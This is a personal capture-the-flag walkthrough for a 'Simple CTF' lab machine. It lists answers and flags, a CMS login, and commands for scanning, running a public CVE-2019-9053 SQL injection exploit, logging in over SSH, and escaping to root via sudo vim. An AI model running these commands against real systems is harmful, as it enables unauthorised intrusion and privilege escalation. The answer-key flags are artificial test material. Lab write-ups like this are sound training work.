export IP=10.10.87.213


==================================================

[TASK 1] - Simple CTF

1) How many services are running under port 1000?

	Answer: `2`
	Notes: See approach step #1.

2) What is running on the higher port?

	Answer: `SSH`
	Notes: See approach step #1.

3) What's the CVE you're using against the application?

	Answer: `CVE-2019-9053`
	Notes: See approach step #4.

4) To what kind of vulnerability is the application vulnerable?

	Answer: `SQLI`
	Notes: Kind of guessed. I knew the CVE was SQL injection based so I took a swing for SQLI.

5) What's the password?

	Answer: `secret`
	Notes: See approach step #5.

6) Where can you login with the details obtained?
	
	Answer: `SSH`

7) What's the user flag?

	Answer: `G00d j0b, keep up!`
	Notes: Located at /home/mitch/user.txt.

8) Is there any other user in the home directory? What's its name?

	Answer: `sunbath`

9) What can you leverage to spawn a privileged shell?

	Answer: `vim`
	Notes: See approach steps #7 & #8.

10) What's the root flag?

	Answer: `W3ll d0n3. You made it!`


==================================================

[IMPORTANT INFORMATION]

CMS Username: mitch
CMS Password: secret

Script to spawn root access: `sudo vim -c ':!/bin/sh'`


==================================================

[APPROACH]

1) Scan using nmap:

	Command: `nmap -sV -sC -oN nmap/initial $IP`

2) Running gobuster:

	Command: `gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,py,js,html,css,sh -o gobuster.txt`

3) Running nikto:

	Command: `nikto -h http://$IP | tee nikto.log`

4) Found /simple from gobuster. Checked it out and it is a "CMS Made Simple version 2.2.8" website. Checking exploit-db for a CVE.

	Notes: Found CVE-2019-9053 (Unauthenticated SQL Injection; https://www.exploit-db.com/exploits/46635)

5) Tried using the CVE script, cve-2019-9053.py:

	Command: `python cve-2019-9053.py -u http://$IP/simple -w /usr/share/wordlists/best110.txt --crack`
	Notes:
		- Saved output to cve-2019-9053-output.txt, but didn't seem to work the first time. Gonna try adding the -c flag (crack flag).
		- Didn't seem to work either. Ended up finding another cve-2019-9053.py script (https://gist.github.com/pdelteil/6ebac2290a6fb33eea1af194485a22b1), and gave it a try. It worked. See `cve-2019-9053-output.txt`.

6) Following along with the questions, we can use the username and password to SSH into the box, but remember the SSH port is 2222.
	
	Command: `ssh mitch@$IP -p 2222`

7) Ran `sudo -l` to see what I could do as mitch and got this output:

	Output: User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
    Notes:
    	- Makes me think I can break out into a root level shell using vim.

8) On GTFOBins, searching 'vim', I may have found a way to root into the box:

	Command: `sudo vim -c ':!/bin/sh'`
	Notes:
		- YUP!